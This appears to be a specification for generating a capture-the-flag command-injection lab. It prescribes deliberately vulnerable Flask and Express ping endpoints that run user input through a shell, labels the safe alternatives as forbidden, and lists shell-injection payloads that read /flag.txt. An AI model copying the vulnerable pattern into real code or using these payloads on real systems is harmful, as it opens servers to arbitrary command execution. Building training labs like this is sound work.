# Command Injection

## Vulnerability Type
`cmdi` — CWE-78 — OWASP A03:2021 Injection

## Architecture
- **Backend**: Python Flask OR Node.js Express
- **Database**: None required
- **Container**: Single container with `/flag.txt` inside

## Vulnerable Code Pattern (MUST USE)

### Python Flask (Preferred)
```python
import subprocess

# VULNERABLE: cmdi — shell=True with f-string interpolation
@app.route('/ping', methods=['POST'])
def ping():
    host = request.form.get('host', '')
    result = subprocess.run(f"ping -c 2 {host}", shell=True, capture_output=True, text=True, timeout=10)
    return f"<pre>{result.stdout}\n{result.stderr}</pre>"
```

### Node.js Express
```javascript
const { execSync } = require('child_process');

// VULNERABLE: cmdi — execSync with string interpolation (runs in shell)
app.post('/ping', (req, res) => {
    const host = req.body.host || '';
    try {
        const output = execSync(`ping -c 2 ${host}`, { timeout: 10000 }).toString();
        res.send(`<pre>${output}</pre>`);
    } catch (e) {
        res.send(`<pre>${e.stderr?.toString() || e.message}</pre>`);
    }
});
```

## Secure Code Pattern (MUST AVOID)
```python
# SAFE — list args, no shell (DO NOT USE)
subprocess.run(["ping", "-c", "2", host], capture_output=True)
# SAFE — shlex.quote (DO NOT USE)
import shlex
subprocess.run(f"ping -c 2 {shlex.quote(host)}", shell=True)
```
```javascript
// SAFE — execFile with array args (DO NOT USE)
const { execFile } = require('child_process');
execFile('ping', ['-c', '2', host], callback);
```

## Flag Delivery
- Flag written to `/flag.txt` inside the container via Dockerfile:
  ```dockerfile
  RUN echo "FLAG_PLACEHOLDER" > /flag.txt
  ```
- Player injects command separator to read it

## Exploit Payload
```
host=127.0.0.1; cat /flag.txt
host=127.0.0.1 | cat /flag.txt
host=127.0.0.1 && cat /flag.txt
host=$(cat /flag.txt)
```

## Docker Setup
```dockerfile
FROM python:3.11-slim
WORKDIR /app
RUN apt-get update && apt-get install -y iputils-ping
RUN echo "FLAG_PLACEHOLDER" > /flag.txt
COPY requirements.txt .
RUN pip install -r requirements.txt
COPY . .
EXPOSE 3000
CMD ["python", "app.py"]
```

## Validation Criteria
- Command execution MUST use `shell=True` (Python) or `execSync`/`exec` with string (Node)
- No `shlex.quote`, no input validation, no character filtering
- `/flag.txt` MUST exist in the container with the correct flag value
- Command output MUST be returned in the HTTP response
- Semicolon injection `; cat /flag.txt` MUST work
